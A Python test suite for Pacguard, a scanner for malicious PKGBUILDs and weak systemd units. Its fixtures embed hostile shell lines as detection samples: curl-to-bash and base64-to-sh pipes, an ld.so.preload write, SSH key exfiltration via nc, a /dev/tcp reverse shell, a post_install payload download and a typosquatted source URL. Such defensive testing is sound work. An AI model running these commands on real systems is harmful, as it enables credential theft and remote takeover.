"""
Unit and integration test suite for Pacguard.

Validates PKGBUILD parsing, heuristic rule detections, version differential analysis,
systemd exposure scoring across 24 directives, SARIF v2.1.0 schema compliance,
CLI subcommands, and zero-leak constraints.
"""

from __future__ import annotations

import io
import json
import os
import re
import sys
import tempfile
import unittest
from pathlib import Path

from pacguard.cli import main
from pacguard.pkgbuild_diff import PKGBUILDDiffer
from pacguard.pkgbuild_parser import PKGBUILDData, PKGBUILDParser, SourceEntry
from pacguard.sarif import SarifExporter, ScorecardRenderer
from pacguard.shell_heuristics import Finding, Severity, ShellHeuristicsEngine
from pacguard.systemd_scorer import SystemdScorer, UnitAuditResult


class TestPKGBUILDParser(unittest.TestCase):
    """Test PKGBUILD parser variables, arrays, sources, and lifecycle functions."""

    def test_pkgbuild_parser_variables(self) -> None:
        content = """
        pkgname=audit-tool
        pkgver=1.4.2
        pkgrel=2
        epoch=1
        pkgdesc="High security static analysis tool"
        url="https://audit-tool.org"
        """
        parser = PKGBUILDParser(content)
        data = parser.parse()

        self.assertEqual(data.pkgname, "audit-tool")
        self.assertEqual(data.pkgver, "1.4.2")
        self.assertEqual(data.pkgrel, "2")
        self.assertEqual(data.epoch, "1")
        self.assertEqual(data.pkgdesc, "High security static analysis tool")
        self.assertEqual(data.url, "https://audit-tool.org")

    def test_pkgbuild_parser_variable_substitution(self) -> None:
        content = """
        pkgname=sample-app
        pkgver=2.1.0
        source=("https://example.org/download/${pkgname}-${pkgver}.tar.gz")
        """
        parser = PKGBUILDParser(content)
        data = parser.parse()

        self.assertEqual(len(data.source), 1)
        self.assertEqual(
            data.source[0].url,
            "https://example.org/download/sample-app-2.1.0.tar.gz",
        )

    def test_pkgbuild_parser_multiline_arrays(self) -> None:
        content = """
        arch=('x86_64' 'aarch64')
        depends=(
            'glibc>=2.35'
            'openssl' # OpenSSL 3.x
            'zlib'
        )
        makedepends=('cmake' 'ninja')
        """
        parser = PKGBUILDParser(content)
        data = parser.parse()

        self.assertEqual(data.arch, ["x86_64", "aarch64"])
        self.assertEqual(data.depends, ["glibc>=2.35", "openssl", "zlib"])
        self.assertEqual(data.makedepends, ["cmake", "ninja"])

    def test_pkgbuild_parser_sources_and_aliases(self) -> None:
        content = """
        source=(
            "my-archive.tar.gz::https://upstream.net/releases/v1.0.tar.gz"
            "git+https://github.com/upstream/repo.git#tag=v1.0"
            "local-fix.patch"
        )
        sha256sums=(
            '1111111111111111111111111111111111111111111111111111111111111111'
            'SKIP'
            '2222222222222222222222222222222222222222222222222222222222222222'
        )
        """
        parser = PKGBUILDParser(content)
        data = parser.parse()

        self.assertEqual(len(data.source), 3)

        s0 = data.source[0]
        self.assertEqual(s0.alias, "my-archive.tar.gz")
        self.assertEqual(s0.url, "https://upstream.net/releases/v1.0.tar.gz")
        self.assertEqual(s0.domain, "upstream.net")
        self.assertFalse(s0.is_vcs)
        self.assertTrue(s0.is_remote)

        s1 = data.source[1]
        self.assertIsNone(s1.alias)
        self.assertTrue(s1.is_vcs)
        self.assertEqual(s1.domain, "github.com")

        s2 = data.source[2]
        self.assertFalse(s2.is_remote)
        self.assertEqual(s2.filename, "local-fix.patch")

    def test_pkgbuild_parser_functions(self) -> None:
        content = """
        prepare() {
            cd "${srcdir}"
            if [ -f patch.diff ]; then
                patch -p1 < patch.diff
            fi
        }

        build() {
            cargo build --release
        }

        package() {
            install -Dm755 target/release/app "${pkgdir}/usr/bin/app"
        }
        """
        parser = PKGBUILDParser(content)
        data = parser.parse()

        self.assertIn("prepare", data.functions)
        self.assertIn("build", data.functions)
        self.assertIn("package", data.functions)

        prep = data.functions["prepare"]
        self.assertTrue(prep.start_line > 0)
        self.assertTrue(prep.end_line >= prep.start_line)
        self.assertIn("patch -p1 < patch.diff", prep.body)

    def test_install_script_parser(self) -> None:
        content = """
        post_install() {
            echo "Installing service..."
            systemctl daemon-reload
        }

        post_upgrade() {
            post_install
        }
        """
        funcs = PKGBUILDParser.parse_script_functions(content)
        self.assertIn("post_install", funcs)
        self.assertIn("post_upgrade", funcs)
        self.assertIn("systemctl daemon-reload", funcs["post_install"].body)


class TestShellHeuristicsEngine(unittest.TestCase):
    """Test AST and pattern heuristic security rules."""

    def test_heuristic_curl_sh_pipe(self) -> None:
        content = """
        pkgname=malicious-demo
        pkgver=1.0.0
        prepare() {
            curl -sSL https://suspicious.io/run.sh | bash
        }
        """
        data = PKGBUILDParser(content).parse()
        engine = ShellHeuristicsEngine()
        findings = engine.analyze(data)

        rule_ids = [f.rule_id for f in findings]
        self.assertIn("PG001_NETWORK_EXEC_PIPE", rule_ids)
        pipe_finding = next(f for f in findings if f.rule_id == "PG001_NETWORK_EXEC_PIPE")
        self.assertEqual(pipe_finding.severity, Severity.CRITICAL)
        self.assertEqual(pipe_finding.function_name, "prepare")

    def test_heuristic_base64_eval(self) -> None:
        content = """
        pkgname=obfuscated-demo
        pkgver=1.0.0
        build() {
            echo "aGVsbG8gd29ybGQ=" | base64 -d | sh
        }
        """
        data = PKGBUILDParser(content).parse()
        engine = ShellHeuristicsEngine()
        findings = engine.analyze(data)

        rule_ids = [f.rule_id for f in findings]
        self.assertIn("PG002_OBFUSCATED_PAYLOAD_EVAL", rule_ids)

    def test_heuristic_ld_preload(self) -> None:
        content = """
        pkgname=rootkit-injector
        pkgver=1.0.0
        package() {
            echo "/usr/lib/stealth.so" > /etc/ld.so.preload
        }
        """
        data = PKGBUILDParser(content).parse()
        engine = ShellHeuristicsEngine()
        findings = engine.analyze(data)

        rule_ids = [f.rule_id for f in findings]
        self.assertIn("PG003_LD_PRELOAD_TAMPERING", rule_ids)

    def test_heuristic_ssh_credential_harvesting(self) -> None:
        content = """
        pkgname=credential-stealer
        pkgver=1.0.0
        package() {
            cat ~/.ssh/id_rsa | nc 198.51.100.1 9000
        }
        """
        data = PKGBUILDParser(content).parse()
        engine = ShellHeuristicsEngine()
        findings = engine.analyze(data)

        rule_ids = [f.rule_id for f in findings]
        self.assertIn("PG004_CREDENTIAL_EXFILTRATION", rule_ids)

    def test_heuristic_skip_checksum_on_archive(self) -> None:
        content = """
        pkgname=unverified-tarball
        pkgver=1.0.0
        source=("https://example.com/downloads/v${pkgver}.tar.gz")
        sha256sums=('SKIP')
        """
        data = PKGBUILDParser(content).parse()
        engine = ShellHeuristicsEngine()
        findings = engine.analyze(data)

        rule_ids = [f.rule_id for f in findings]
        self.assertIn("PG005_SKIP_CHECKSUM_NON_VCS", rule_ids)

    def test_heuristic_skip_checksum_vcs_allowed(self) -> None:
        content = """
        pkgname=vcs-package-git
        pkgver=1.0.0.r12
        source=("git+https://github.com/example/repo.git#branch=main")
        sha256sums=('SKIP')
        """
        data = PKGBUILDParser(content).parse()
        engine = ShellHeuristicsEngine()
        findings = engine.analyze(data)

        # VCS sources like git+https are allowed to use SKIP; must not trigger PG005
        rule_ids = [f.rule_id for f in findings]
        self.assertNotIn("PG005_SKIP_CHECKSUM_NON_VCS", rule_ids)

    def test_heuristic_reverse_shell_socket(self) -> None:
        content = """
        pkgname=rev-shell
        pkgver=1.0.0
        package() {
            bash -i >& /dev/tcp/10.0.0.1/1337 0>&1
        }
        """
        data = PKGBUILDParser(content).parse()
        engine = ShellHeuristicsEngine()
        findings = engine.analyze(data)

        rule_ids = [f.rule_id for f in findings]
        self.assertIn("PG008_REVERSE_SHELL_SOCKET", rule_ids)

    def test_heuristic_install_hook_network(self) -> None:
        content = """
        pkgname=hook-demo
        pkgver=1.0.0
        """
        data = PKGBUILDParser(content).parse()

        install_content = """
        post_install() {
            wget https://remote-c2.net/payload.bin -O /usr/bin/daemon
        }
        """
        data.install_functions = PKGBUILDParser.parse_script_functions(install_content)

        engine = ShellHeuristicsEngine()
        findings = engine.analyze(data)

        rule_ids = [f.rule_id for f in findings]
        self.assertIn("PG007_INSTALL_HOOK_NETWORK_FETCH", rule_ids)


class TestPKGBUILDDiffer(unittest.TestCase):
    """Test version differential supply chain anomaly detection."""

    def test_diff_url_hijack(self) -> None:
        v1_text = """
        pkgname=aur-tool
        pkgver=1.0.0
        source=("https://github.com/legitimate-org/aur-tool/releases/download/v1.0.0/src.tar.gz")
        sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')
        """
        v2_text = """
        pkgname=aur-tool
        pkgver=1.0.1
        source=("https://githvb.com/legitimate-org/aur-tool/releases/download/v1.0.1/src.tar.gz")
        sha256sums=('abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890')
        """
        v1_data = PKGBUILDParser(v1_text).parse()
        v2_data = PKGBUILDParser(v2_text).parse()

        differ = PKGBUILDDiffer(v1_data, v2_data)
        diffs = differ.compare()

        rule_ids = [d.rule_id for d in diffs]
        self.assertIn("PG_DIFF_URL_HIJACK", rule_ids)
        hijack = next(d for d in diffs if d.rule_id == "PG_DIFF_URL_HIJACK")
        self.assertEqual(hijack.severity, Severity.CRITICAL)

    def test_diff_checksum_downgrade(self) -> None:
        v1_text = """
        pkgname=secure-hash
        pkgver=1.0.0
        source=("https://example.com/src.tar.gz")
        sha256sums=('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
        """
        v2_text = """
        pkgname=secure-hash
        pkgver=1.1.0
        source=("https://example.com/src.tar.gz")
        sha256sums=('SKIP')
        """
        v1_data = PKGBUILDParser(v1_text).parse()
        v2_data = PKGBUILDParser(v2_text).parse()

        differ = PKGBUILDDiffer(v1_data, v2_data)
        diffs = differ.compare()

        rule_ids = [d.rule_id for d in diffs]
        self.assertIn("PG_DIFF_CHECKSUM_DOWNGRADE", rule_ids)

    def test_diff_depends_injection(self) -> None:
        v1_text = """
        pkgname=app
        pkgver=1.0
        depends=('glibc')
        """
        v2_text = """
        pkgname=app
        pkgver=1.1
        depends=('glibc' 'malicious-lib-backdoor')
        """
        v1_data = PKGBUILDParser(v1_text).parse()
        v2_data = PKGBUILDParser(v2_text).parse()

        differ = PKGBUILDDiffer(v1_data, v2_data)
        diffs = differ.compare()

        rule_ids = [d.rule_id for d in diffs]
        self.assertIn("PG_DIFF_DEPENDS_INJECTION", rule_ids)

    def test_diff_lifecycle_hook_injection(self) -> None:
        v1_text = """
        pkgname=app
        pkgver=1.0
        build() { make; }
        """
        v2_text = """
        pkgname=app
        pkgver=1.1
        prepare() { echo "Injected hook"; }
        build() { make; }
        """
        v1_data = PKGBUILDParser(v1_text).parse()
        v2_data = PKGBUILDParser(v2_text).parse()

        differ = PKGBUILDDiffer(v1_data, v2_data)
        diffs = differ.compare()

        rule_ids = [d.rule_id for d in diffs]
        self.assertIn("PG_DIFF_HOOK_INJECTION", rule_ids)


class TestSystemdScorer(unittest.TestCase):
    """Test systemd 24-directive sandboxing security scorer."""

    def test_systemd_hardened_score(self) -> None:
        root_dir = Path(__file__).resolve().parent.parent
        hardened_path = root_dir / "samples" / "hardened_vs_weak.service" / "hardened.service"
        result = SystemdScorer.audit_file(str(hardened_path))

        self.assertEqual(result.rating, "SAFE")
        self.assertLessEqual(result.exposure_score, 3.3)
        self.assertGreaterEqual(result.hardened_count, 20)

    def test_systemd_weak_score(self) -> None:
        root_dir = Path(__file__).resolve().parent.parent
        weak_path = root_dir / "samples" / "hardened_vs_weak.service" / "weak.service"
        result = SystemdScorer.audit_file(str(weak_path))

        self.assertEqual(result.rating, "EXPOSED")
        self.assertGreaterEqual(result.exposure_score, 8.5)
        self.assertLessEqual(result.hardened_count, 2)

    def test_systemd_24_directives_evaluated(self) -> None:
        content = """
        [Service]
        ExecStart=/bin/echo
        """
        result = SystemdScorer.audit_content(content)
        self.assertEqual(result.total_directives, 24)
        self.assertEqual(len(result.assessments), 24)

        directive_names = {a.directive for a in result.assessments}
        expected = {
            "User",
            "DynamicUser",
            "ProtectSystem",
            "ProtectHome",
            "NoNewPrivileges",
            "CapabilityBoundingSet",
            "AmbientCapabilities",
            "MemoryDenyWriteExecute",
            "PrivateTmp",
            "PrivateDevices",
            "PrivateNetwork",
            "ProtectKernelTunables",
            "ProtectKernelModules",
            "ProtectKernelLogs",
            "ProtectControlGroups",
            "ProtectClock",
            "ProtectHostname",
            "RestrictRealtime",
            "RestrictNamespaces",
            "RestrictAddressFamilies",
            "LockPersonality",
            "SystemCallFilter",
            "SystemCallArchitectures",
            "RemoveIPC",
        }
        self.assertEqual(directive_names, expected)


class TestSarifAndReporting(unittest.TestCase):
    """Test OASIS SARIF v2.1.0 output compliance and CLI execution."""

    def test_sarif_schema_compliance(self) -> None:
        findings = [
            Finding(
                rule_id="PG001_NETWORK_EXEC_PIPE",
                severity=Severity.CRITICAL,
                title="RCE via Curl Pipe",
                description="Network stream piped to shell",
                mitre_technique="T1059.004",
                line_number=12,
                file_path="PKGBUILD",
                snippet="curl https://foo | sh",
                function_name="prepare",
            )
        ]
        sarif_json = SarifExporter.export(findings=findings)
        parsed = json.loads(sarif_json)

        self.assertEqual(parsed["version"], "2.1.0")
        self.assertEqual(len(parsed["runs"]), 1)
        run = parsed["runs"][0]
        self.assertEqual(run["tool"]["driver"]["name"], "Pacguard")
        self.assertEqual(len(run["results"]), 1)
        res = run["results"][0]
        self.assertEqual(res["ruleId"], "PG001_NETWORK_EXEC_PIPE")
        self.assertEqual(res["level"], "error")

    def test_cli_subcommands(self) -> None:
        root_dir = Path(__file__).resolve().parent.parent
        v1_path = str(root_dir / "samples" / "compromised_pkgbuild" / "PKGBUILD.v1")
        v2_path = str(root_dir / "samples" / "compromised_pkgbuild" / "PKGBUILD.v2_hijacked")
        weak_service = str(root_dir / "samples" / "hardened_vs_weak.service" / "weak.service")

        # 1. Test scan-pkgbuild
        exit_code = main(["scan-pkgbuild", v1_path, "--format", "json", "--no-color"])
        self.assertEqual(exit_code, 0)

        # 2. Test scan-pkgbuild with fail-on
        exit_code = main(["scan-pkgbuild", v2_path, "--fail-on", "critical", "--no-color"])
        self.assertEqual(exit_code, 1)

        # 3. Test diff-pkgbuild
        exit_code = main(["diff-pkgbuild", v1_path, v2_path, "--format", "json", "--no-color"])
        self.assertEqual(exit_code, 0)

        # 4. Test diff-pkgbuild with fail-on
        exit_code = main(["diff-pkgbuild", v1_path, v2_path, "--fail-on", "critical", "--no-color"])
        self.assertEqual(exit_code, 1)

        # 5. Test audit-systemd
        exit_code = main(["audit-systemd", weak_service, "--fail-on-score", "5.0", "--no-color"])
        self.assertEqual(exit_code, 1)

        # 6. Test export-sarif
        with tempfile.NamedTemporaryFile(suffix=".sarif", mode="w+", delete=False) as tmp:
            tmp_path = tmp.name

        try:
            exit_code = main(["export-sarif", "--pkgbuild", v2_path, "--output", tmp_path])
            self.assertEqual(exit_code, 0)
            with open(tmp_path, "r", encoding="utf-8") as handle:
                sarif_data = json.load(handle)
            self.assertEqual(sarif_data["version"], "2.1.0")
        finally:
            if os.path.isfile(tmp_path):
                os.remove(tmp_path)


class TestZeroLeakConstraint(unittest.TestCase):
    """Assert zero usernames, machine paths, or emojis in repository code."""

    def test_zero_leaks_in_pacguard(self) -> None:
        root_dir = Path(__file__).resolve().parent.parent

        # Regex for emojis
        emoji_pattern = re.compile(
            r"[\U0001F300-\U0001F64F\U0001F680-\U0001F6FF\U0001F700-\U0001F77F"
            r"\U0001F780-\U0001F7FF\U0001F800-\U0001F8FF\U0001F900-\U0001F9FF"
            r"\U0001FA00-\U0001FA6F\U0001FA70-\U0001FAFF\U00002600-\U000026FF\U00002700-\U000027BF]"
        )

        # Regex for machine paths
        path_leak_pattern = re.compile(r"(/home/[a-zA-Z0-9_-]+|/Users/[a-zA-Z0-9_-]+|C:\\\\Users\\\\[a-zA-Z0-9_-]+)")

        scan_dirs = [root_dir / "pacguard", root_dir / "tests", root_dir / "samples"]
        checked_files = 0

        for d in scan_dirs:
            for p in d.rglob("*"):
                if (
                    p.is_file()
                    and not p.name.startswith(".")
                    and "__pycache__" not in p.parts
                    and p.suffix not in (".pyc", ".pyo")
                ):
                    with open(p, "r", encoding="utf-8", errors="replace") as f:
                        content = f.read()
                        checked_files += 1

                        self.assertIsNone(
                            emoji_pattern.search(content),
                            f"Emoji detected in {p}",
                        )

                        # Check for hardcoded paths, excluding generic documentation tokens
                        for line_idx, line in enumerate(content.splitlines(), 1):
                            if "/home/<user>" in line or "/Users/<user>" in line:
                                continue
                            self.assertIsNone(
                                path_leak_pattern.search(line),
                                f"Machine path leak detected in {p}:{line_idx}: {line}",
                            )

        self.assertGreater(checked_files, 5)


if __name__ == "__main__":
    unittest.main()
